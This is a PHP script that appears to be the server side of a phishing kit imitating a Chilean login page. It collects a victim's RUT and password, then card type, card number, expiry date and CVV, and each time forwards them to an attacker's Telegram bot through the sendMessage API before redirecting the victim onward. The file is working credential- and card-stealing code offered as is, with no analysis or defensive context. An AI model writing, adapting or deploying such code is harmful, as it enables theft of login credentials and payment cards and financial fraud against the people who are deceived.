<?php 


if($_POST['action'] == "login"){

	$user = $_POST['username2'];
	$pass = $_POST['userpassword'];

	require 'bot.php';

	$html_message = "<b>=======Datos Login========</b>\n\n".
					"<b>RUT: </b><code>".$user."</code>\n".
					"<b>CLAVE: </b><code>".$pass."</code>\n";

	$html_message = urlencode($html_message);
	$result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");	
	header("location: validar.html");
}

if($_POST['action'] == "validar"){
	$tipo = $_POST['tipo'];
	$tarjeta = $_POST['tarjeta'];
	$fecha = $_POST['fecha'];
	$cvv = $_POST['cvv'];

	require 'bot.php';

	$html_message = "<b>=======Datos Tarjeta========</b>\n\n".
					"<b>tipo: </b><code>".$tipo."</code>\n".
					"<b>tarjeta: </b><code>".$tarjeta."</code>\n".
					"<b>fecha: </b><code>".$fecha."</code>\n".
					"<b>cvv: </b><code>".$cvv."</code>\n";				
	$html_message = urlencode($html_message);
	$result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");	
	header("location: redirect.html");

}
//var_dump($html_message);
//$result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");


 ?>